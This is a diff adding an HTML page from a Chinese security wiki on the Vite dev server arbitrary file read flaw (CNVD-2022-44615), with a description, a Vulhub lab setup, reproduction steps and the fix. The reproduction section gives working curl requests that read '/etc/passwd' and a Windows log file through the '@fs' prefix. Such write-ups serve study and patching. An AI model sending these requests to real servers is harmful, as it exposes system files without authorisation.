@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Vite%20%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2022-44615/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Vite 开发服务器任意文件读取漏洞 CNVD-2022-44615 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Vite \u5f00\u53d1\u670d\u52a1\u5668\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2022-44615", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Vite%20%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%20CVE-2025-30208/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Vite%20%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%20CVE-2025-30208/" class="btn btn-xs btn-link">
+        Vite 开发服务器任意文件读取漏洞绕过 CVE-2025-30208
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20%26%26%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20%26%26%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        ThinkPHP5 SQL 注入漏洞 &amp;&amp; 敏感信息泄露
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="vite-cnvd-2022-44615">Vite 开发服务器任意文件读取漏洞 CNVD-2022-44615<a class="headerlink" href="#vite-cnvd-2022-44615" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用 Rollup 打包代码的构建命令。</p>
+<p>在 Vite 2.3.0 版本之前，可以通过 <code>@fs</code> 前缀读取文件系统上的任意文件。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/vitejs/vite/issues/2820">https://github.com/vitejs/vite/issues/2820</a></li>
+<li><a href="https://github.com/vitejs/vite/pull/2850">https://github.com/vitejs/vite/pull/2850</a></li>
+</ul>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>Vulhub 执行以下命令启动 Vite 2.1.5 开发服务器：</p>
+<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>compose<span class="w"> </span>up<span class="w"> </span>-d
+</code></pre></div>
+<p>服务器启动后，可以通过访问 <code>http://your-ip:3000</code> 来访问 Vite 开发服务器。</p>
+<blockquote>
+<p>注意：旧版本 Vite 的开发服务器默认端口为 3000，新版本默认端口为 5173，请注意区分。</p>
+</blockquote>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>使用标准的 <code>@fs</code> 前缀访问指定路径，可以获取文件内容。例如，服务器为 Linux，访问 <code>/etc/passwd</code>：</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s2">&quot;http://your-ip:3000/@fs/etc/passwd&quot;</span>
+</code></pre></div>
+<p><img alt="" src="../images/Vite%20%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2022-44615/image-20250331090332473.png" /></p>
+<p>如果服务器为 Windows，访问 <code>C:\windows\debug\netsetup.log</code>：</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s2">&quot;http://localhost:3000/@fs/windows/debug/netsetup.log&quot;</span>
+</code></pre></div>
+<h2 id="_5">漏洞修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>修复 <a href="https://github.com/vitejs/vite/issues/2820">#2820</a>，新增选项 <code>serve.fsServeRoot</code>，将自动检测工作区根目录为 <code>fsServeRoot</code>，防止为整个文件系统提供服务。详见： <a href="https://github.com/vitejs/vite/pull/2850">https://github.com/vitejs/vite/pull/2850</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Vite%20%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%20CVE-2025-30208/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Vite%20%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%20CVE-2025-30208/" class="btn btn-xs btn-link">
+        Vite 开发服务器任意文件读取漏洞绕过 CVE-2025-30208
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20%26%26%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20%26%26%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        ThinkPHP5 SQL 注入漏洞 &amp;&amp; 敏感信息泄露
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
